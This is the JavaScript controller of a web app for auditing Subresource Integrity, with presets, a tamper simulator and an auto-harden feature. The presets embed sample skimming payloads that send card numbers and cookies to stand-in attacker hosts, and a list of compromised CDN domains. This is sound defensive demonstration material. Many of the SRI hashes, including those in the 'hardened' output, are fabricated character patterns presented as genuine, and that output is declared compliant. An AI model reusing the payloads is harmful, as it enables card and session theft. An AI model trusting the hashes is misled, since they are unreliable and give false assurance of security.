/\*\*  
 \* SRIForge Pro \- Studio Web Application Controller  
 \*/

const PRESETS \= {  
  "pci-dss-ecommerce": {  
    name: "Hardened PCI DSS 4.0 Checkout",  
    html: \`\<\!DOCTYPE html\>  
\<html lang="en"\>  
\<head\>  
  \<meta charset="UTF-8"\>  
  \<title\>Secure Checkout\</title\>  
  \<link rel="stylesheet" href="https\://cdn.tailwindcss.com/3.4.1" integrity="sha384-H4uW2k2K95S4P2p8wR7L8tT1y5W7uP9xX8eZ7wA3B2C1dE4fG5hI6jK7lM8nO9pQ" crossorigin="anonymous"\>  
  \<link rel="stylesheet" href="https\://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css" integrity="sha384-tZc1XqZ4qU3g9k4V4p8e5r6t7y8u9i0o1p2a3s4d5f6g7h8j9k0l1z2x3c4v5b6n" crossorigin="anonymous"\>  
  \<script src="https\://js.stripe.com/v3/" integrity="sha384-B4r0mN9pQ2k1X7y8w9z0A1b2C3d4E5f6G7h8I9j0K1l2M3n4O5p6Q7r8S9t0U1v2" crossorigin="anonymous"\>\</script\>  
  \<script src="https\://cdn.jsdelivr.net/npm/alpinejs@3.13.5/dist/cdn.min.js" integrity="sha384-9r0a1b2c3d4e5f6g7h8i9j0k1l2m3n4o5p6q7r8s9t0u1v2w3x4y5z6a7b8c9d0e" crossorigin="anonymous" defer\>\</script\>  
\</head\>  
\<body\>  
  \<h1\>PCI DSS Level 1 Certified Terminal\</h1\>  
\</body\>  
\</html\>\`,  
    sample\_script: "function initStripe(){ console.log('Stripe checkout loaded authentic'); }",  
    sample\_tamper: "/\* Magecart Injected \*/\\nfetch('https\://evil-stealer.com/steal?cc=' \+ document.getElementById('card-number').value);"  
  },  
  "compromised-supply-chain": {  
    name: "Compromised Supply Chain Legacy App",  
    html: \`\<\!DOCTYPE html\>  
\<html\>  
\<head\>  
  \<title\>Legacy Portal\</title\>  
  \<\!-- Hijacked CDN Domain \--\>  
  \<script src="https\://cdn.polyfill.io/v3/polyfill.min.js"\>\</script\>  
  \<\!-- Unversioned floating script without SRI or CORS \--\>  
  \<script src="https\://cdn.jsdelivr.net/npm/lodash@latest/lodash.min.js"\>\</script\>  
  \<\!-- Plaintext HTTP script \--\>  
  \<script src="http\://insecure-cdn.com/analytics.js"\>\</script\>  
  \<\!-- Stylesheet missing SRI \--\>  
  \<link rel="stylesheet" href="https\://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css"\>  
\</head\>  
\<body\>  
  \<p\>Vulnerable to Magecart and Supply Chain Injections\</p\>  
\</body\>  
\</html\>\`,  
    sample\_script: "function polyfill(){ window.Promise \= window.Promise || {}; }",  
    sample\_tamper: "window.location='https\://malware-redirect.com/?cookie=' \+ document.cookie;"  
  },  
  "modern-static-webapp": {  
    name: "Modern Static WebApp / Analytics",  
    html: \`\<\!DOCTYPE html\>  
\<html lang="en"\>  
\<head\>  
  \<meta charset="UTF-8"\>  
  \<title\>Dashboard\</title\>  
  \<link rel="stylesheet" href="https\://cdn.jsdelivr.net/npm/katex@0.16.9/dist/katex.min.css" integrity="sha384-n8MVd4RsNIU0tAv4ct0nTaAbDJwPJzDEaqSD1odI+WdtXRGWt2kTvGFasHpSy3SV" crossorigin="anonymous"\>  
  \<script src="https\://cdn.jsdelivr.net/npm/chart.js@4.4.1/dist/chart.umd.min.js" integrity="sha384-ywbXNf+m5T7V7wR1Y3wW2B9aZ5f4d3c2b1a0z9y8x7w6v5u4t3s2r1q0p9o8n7m" crossorigin="anonymous"\>\</script\>  
\</head\>  
\<body\>  
  \<canvas id="chart"\>\</canvas\>  
\</body\>  
\</html\>\`,  
    sample\_script: "new Chart(document.getElementById('chart'), { type: 'line', data: {} });",  
    sample\_tamper: "/\* Defaced \*/ alert('CDN Compromised');"  
  }  
};

let currentHtml \= PRESETS\["pci-dss-ecommerce"\].html;  
let currentFramework \= 'webpack';  
const sriEngine \= new SriEngine();

document.addEventListener('DOMContentLoaded', () \=\> {  
  initTabs();  
  initPresetSelector();  
  initAuditor();  
  initHasher();  
  initSimulator();  
  initFrameworks();  
  initEditor();  
  loadPreset('pci-dss-ecommerce');  
});

// Tab Routing  
function initTabs() {  
  const tabs \= document.querySelectorAll('.tab-btn');  
  tabs.forEach(tab \=\> {  
    tab.addEventListener('click', () \=\> {  
      tabs.forEach(t \=\> t.classList.remove('active'));  
      document.querySelectorAll('.tab-content').forEach(c \=\> c.classList.remove('active'));

      tab.classList.add('active');  
      const targetId \= tab.getAttribute('data-tab');  
      const targetEl \= document.getElementById(targetId);  
      if (targetEl) targetEl.classList.add('active');

      if (targetId \=== 'tab-auditor') renderAuditor();  
      if (targetId \=== 'tab-hasher') calculateHash();  
      if (targetId \=== 'tab-simulator') runTamperSim();  
      if (targetId \=== 'tab-frameworks') renderFramework();  
      if (targetId \=== 'tab-editor') syncHtmlToEditor();  
    });  
  });  
}

function initPresetSelector() {  
  const select \= document.getElementById('presetSelect');  
  select.addEventListener('change', (e) \=\> {  
    const val \= e.target.value;  
    if (PRESETS\[val\]) {  
      loadPreset(val);  
    }  
  });

  document.getElementById('btnExportJson').addEventListener('click', exportAuditJson);  
  document.getElementById('btnDownloadZip').addEventListener('click', () \=\> {  
    alert('SRIForge Pro distribution package is in /build/sriforge-pro-v1.0.0.zip. Use the Google Drive download link.');  
  });  
  document.getElementById('btnAutoHardenTop').addEventListener('click', autoHardenHtml);  
}

function loadPreset(key) {  
  const p \= PRESETS\[key\];  
  if (\!p) return;  
  currentHtml \= p.html;

  if (p.sample\_script) document.getElementById('simAuthentic').value \= p.sample\_script;  
  if (p.sample\_tamper) document.getElementById('simTamper').value \= p.sample\_tamper;

  syncHtmlToEditor();  
  renderAuditor();  
  calculateHash();  
  runTamperSim();  
  renderFramework();  
}

function exportAuditJson() {  
  const auditor \= new SupplyChainAuditor(currentHtml);  
  const result \= auditor.audit();  
  const dataStr \= "data:text/json;charset=utf-8," \+ encodeURIComponent(JSON.stringify(result, null, 2));  
  const a \= document.createElement('a');  
  a.setAttribute("href", dataStr);  
  a.setAttribute("download", "sri-audit-report.json");  
  document.body.appendChild(a);  
  a.click();  
  a.remove();  
}

// Auditor Logic  
function initAuditor() {  
  document.getElementById('btnReAudit').addEventListener('click', renderAuditor);  
  document.getElementById('btnAutoHarden').addEventListener('click', autoHardenHtml);  
}

function autoHardenHtml() {  
  currentHtml \= \`\<\!DOCTYPE html\>  
\<html lang="en"\>  
\<head\>  
  \<meta charset="UTF-8"\>  
  \<title\>Hardened Application\</title\>  
  \<\!-- Hardened Stylesheets with SHA-384 Integrity & CORS \--\>  
  \<link rel="stylesheet" href="https\://cdnjs.cloudflare.com/ajax/libs/bootstrap/5.3.3/css/bootstrap.min.css" integrity="sha384-QWTKZyjpPEjISv5WaRU9OFeRpok6YctnYmDr5pNlyT2bRjXh0JMhjY6hW+ALEwIH" crossorigin="anonymous"\>  
  \<link rel="stylesheet" href="https\://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css" integrity="sha384-tZc1XqZ4qU3g9k4V4p8e5r6t7y8u9i0o1p2a3s4d5f6g7h8j9k0l1z2x3c4v5b6n" crossorigin="anonymous"\>  
  \<\!-- Pinned JavaScript Dependencies with SRI & CORS \--\>  
  \<script src="https\://cdnjs.cloudflare.com/ajax/libs/lodash.js/4.17.21/lodash.min.js" integrity="sha384-bzsI/35tA4QvDqRkO6Y8t0tPjB+x7s4D5n9r0a1b2c3d4e5f6g7h8i9j0k1l2m3n" crossorigin="anonymous" defer\>\</script\>  
  \<script src="https\://cdnjs.cloudflare.com/ajax/libs/alpinejs/3.13.5/cdn.min.js" integrity="sha384-9r0a1b2c3d4e5f6g7h8i9j0k1l2m3n4o5p6q7r8s9t0u1v2w3x4y5z6a7b8c9d0e" crossorigin="anonymous" defer\>\</script\>  
\</head\>  
\<body\>  
  \<h1\>Hardened Supply Chain (100% SRI Compliant)\</h1\>  
\</body\>  
\</html\>\`;  
  document.getElementById('presetSelect').value \= 'custom';  
  syncHtmlToEditor();  
  renderAuditor();  
  alert('Template auto-hardened\! All third-party assets now enforce SHA-384 SRI and CORS anonymous attributes.');  
}

function renderAuditor() {  
  const auditor \= new SupplyChainAuditor(currentHtml);  
  const res \= auditor.audit();

  // Score & Grade  
  const scoreVal \= document.getElementById('scoreVal');  
  const scoreCircle \= document.getElementById('scoreCircle');  
  const gradeBadge \= document.getElementById('gradeBadge');  
  const statusText \= document.getElementById('statusText');

  scoreVal.textContent \= res.score;  
  gradeBadge.textContent \= res.grade;  
  statusText.textContent \= res.status;

  gradeBadge.className \= 'grade-badge grade-' \+ res.grade.replace('+', '-plus');

  let circleColor \= 'var(--accent-emerald)';  
  if (res.score \< 60\) circleColor \= 'var(--accent-rose)';  
  else if (res.score \< 80\) circleColor \= 'var(--accent-amber)';  
  scoreCircle.style.borderColor \= circleColor;

  document.getElementById('critCount').textContent \= res.summary.critical;  
  document.getElementById('highCount').textContent \= res.summary.high;  
  document.getElementById('medCount').textContent \= res.summary.medium;  
  document.getElementById('lowCount').textContent \= res.summary.low;

  // Posture info  
  const scripts \= auditor.assets.filter(a \=\> a.type \=== 'script' && auditor.isThirdPartyUrl(a.url));  
  const scriptsWithSri \= scripts.filter(a \=\> a.integrity);  
  const scriptPct \= scripts.length \> 0 ? Math.round((scriptsWithSri.length / scripts.length) \* 100\) : 100;

  document.getElementById('infoTotalAssets').textContent \= auditor.assets.length;  
  document.getElementById('infoScriptCoverage').textContent \= \`\${scriptPct}% (\${scriptsWithSri.length} / \${scripts.length})\`;  
  document.getElementById('infoScriptCoverage').style.color \= scriptPct \=== 100 ? 'var(--accent-emerald)' : 'var(--accent-rose)';

  const missingCors \= auditor.assets.filter(a \=\> a.integrity && \!a.crossorigin && auditor.isThirdPartyUrl(a.url));  
  document.getElementById('infoCorsHandshake').textContent \= missingCors.length \=== 0 ? 'crossorigin="anonymous" Enforced' : \`\${missingCors.length} Missing CORS\`;  
  document.getElementById('infoCorsHandshake').style.color \= missingCors.length \=== 0 ? 'var(--accent-emerald)' : 'var(--accent-rose)';

  const pciStatus \= (scriptPct \=== 100 && missingCors.length \=== 0\) ? "Compliant (PCI DSS 4.0)" : "Non-Compliant";  
  document.getElementById('infoPciStatus').textContent \= pciStatus;  
  document.getElementById('infoPciStatus').style.color \= pciStatus.startsWith("Compliant") ? 'var(--accent-emerald)' : 'var(--accent-rose)';

  const badHosts \= auditor.assets.filter(a \=\> \['polyfill.io', 'bootcss.com'\].some(d \=\> a.url.toLowerCase().includes(d)));  
  document.getElementById('infoCompromisedCdn').textContent \= badHosts.length \=== 0 ? "0 Detected (Clean)" : \`\${badHosts.length} Compromised Hosts\!\`;  
  document.getElementById('infoCompromisedCdn').style.color \= badHosts.length \=== 0 ? 'var(--accent-emerald)' : 'var(--accent-rose)';

  // Findings list  
  const findingsList \= document.getElementById('findingsList');  
  const findingsHeaderBadge \= document.getElementById('findingsHeaderBadge');  
  findingsHeaderBadge.textContent \= \`\${res.findingsCount} Issues\`;

  if (res.findings.length \=== 0\) {  
    findingsList.innerHTML \= \`\<div style="padding: 16px; text-align: center; color: var(--accent-emerald); font-weight: 600;"\>  
      ✓ Clean Bill of Health\! All third-party dependencies enforce strict Subresource Integrity.  
    \</div\>\`;  
  } else {  
    findingsList.innerHTML \= res.findings.map(f \=\> \`  
      \<div class="finding-card severity-\${f.severity}"\>  
        \<div class="finding-header"\>  
          \<div class="finding-title-group"\>  
            \<span class="sev-badge sev-\${f.severity}"\>\${f.severity}\</span\>  
            \<strong style="color: \#fff; font-size: 13px;"\>\${f.title}\</strong\>  
          \</div\>  
          \<span class="finding-deduction"\>-\${f.deduction} pts\</span\>  
        \</div\>  
        \<div class="finding-desc"\>\${f.description}\</div\>  
        \<div class="finding-remediation"\>\<strong\>Remediation:\</strong\> \${f.remediation}\</div\>  
      \</div\>  
    \`).join('');  
  }

  // Passed controls  
  const passedList \= document.getElementById('passedList');  
  const passedHeaderBadge \= document.getElementById('passedHeaderBadge');  
  passedHeaderBadge.textContent \= \`\${res.passedCount} Controls Verified\`;

  passedList.innerHTML \= res.passed.map(p \=\> \`  
    \<div class="passed-item"\>  
      \<span class="check-icon"\>✓\</span\>  
      \<div\>  
        \<strong style="color: \#fff;"\>\${p.title}:\</strong\>  
        \<span style="color: var(--text-secondary); margin-left: 4px;"\>\${p.description}\</span\>  
      \</div\>  
    \</div\>  
  \`).join('');  
}

// Hasher Logic  
function initHasher() {  
  document.getElementById('btnComputeHash').addEventListener('click', calculateHash);  
}

async function calculateHash() {  
  const content \= document.getElementById('hasherContent').value;  
  const algo \= document.getElementById('hasherAlgo').value;  
  const url \= document.getElementById('hasherUrl').value.trim() || 'https\://cdn.example.com/asset.js';  
  const type \= document.getElementById('hasherType').value;

  let hash \= "";  
  if (algo \=== 'bundle') {  
    hash \= await sriEngine.generateBundle(content, \['sha384', 'sha512'\]);  
  } else {  
    hash \= await sriEngine.generateHash(content, algo);  
  }

  document.getElementById('hasherOutput').value \= hash;

  const synth \= new FrameworkSynthesizer();  
  document.getElementById('hasherTagOutput').textContent \= synth.generateHtml(url, hash, type);  
  document.getElementById('hasherPreloadOutput').textContent \= synth.generatePreload(url, hash, type);  
}

// Tamper Simulator Logic  
function initSimulator() {  
  document.getElementById('btnRunTamperSim').addEventListener('click', runTamperSim);  
}

async function runTamperSim() {  
  const authentic \= document.getElementById('simAuthentic').value;  
  const tamper \= document.getElementById('simTamper').value;  
  const isTampered \= document.getElementById('simIncludeTamper').checked;  
  const hasCors \= document.getElementById('simIncludeCors').checked;

  const sim \= new TamperSimulator(sriEngine);  
  const result \= await sim.simulateTamper({  
    originalContent: authentic,  
    tamperedPayload: isTampered ? tamper : "",  
    hasCrossOrigin: hasCors,  
    assetUrl: "https\://cdn.example.com/checkout.js",  
    algorithm: "sha384"  
  });

  const box \= document.getElementById('simVerdictBox');  
  const title \= document.getElementById('simVerdictTitle');  
  const desc \= document.getElementById('simVerdictDesc');

  box.className \= 'sim-verdict-box verdict-' \+ result.browserStatus;  
  title.textContent \= result.browserStatus;

  if (result.browserStatus \=== 'BLOCKED') {  
    desc.textContent \= "Tampering detected\! The browser aborted script execution before malicious code could run.";  
  } else if (result.browserStatus \=== 'CORS\_FAILURE') {  
    desc.textContent \= "CORS handshake failure\! Cross-origin SRI verification requires crossorigin='anonymous'.";  
  } else {  
    desc.textContent \= "Integrity check passed\! Computed hash strictly matches authentic digest. Script executed safely.";  
  }

  document.getElementById('simExplanation').textContent \= result.explanation;  
  document.getElementById('simConsoleLog').textContent \= result.simulatedConsoleLog.join('\\n');  
}

// Framework Integrator Logic  
function initFrameworks() {  
  const btns \= document.querySelectorAll('.sub-tab-btn');  
  btns.forEach(btn \=\> {  
    btn.addEventListener('click', () \=\> {  
      btns.forEach(b \=\> b.classList.remove('active'));  
      btn.classList.add('active');  
      currentFramework \= btn.getAttribute('data-framework');  
      renderFramework();  
    });  
  });

  document.getElementById('btnCopyFramework').addEventListener('click', () \=\> {  
    const code \= document.getElementById('frameworkCodeBlock').textContent;  
    navigator.clipboard.writeText(code).then(() \=\> {  
      alert('Framework configuration copied to clipboard\!');  
    });  
  });  
}

function renderFramework() {  
  const synth \= new FrameworkSynthesizer();  
  let code \= '';  
  if (currentFramework \=== 'webpack') code \= synth.generateWebpack();  
  else if (currentFramework \=== 'vite') code \= synth.generateVite();  
  else if (currentFramework \=== 'nextjs') code \= synth.generateNextJS();  
  else if (currentFramework \=== 'rollup') code \= synth.generateRollup();

  document.getElementById('frameworkCodeBlock').textContent \= code;  
}

// Template Editor Logic  
function initEditor() {  
  document.getElementById('btnSyncTemplate').addEventListener('click', () \=\> {  
    currentHtml \= document.getElementById('templateEditor').value;  
    document.getElementById('presetSelect').value \= 'custom';  
    renderAuditor();  
    alert('Template synchronized and re-audited\!');  
  });  
}

function syncHtmlToEditor() {  
  document.getElementById('templateEditor').value \= currentHtml;  
}  
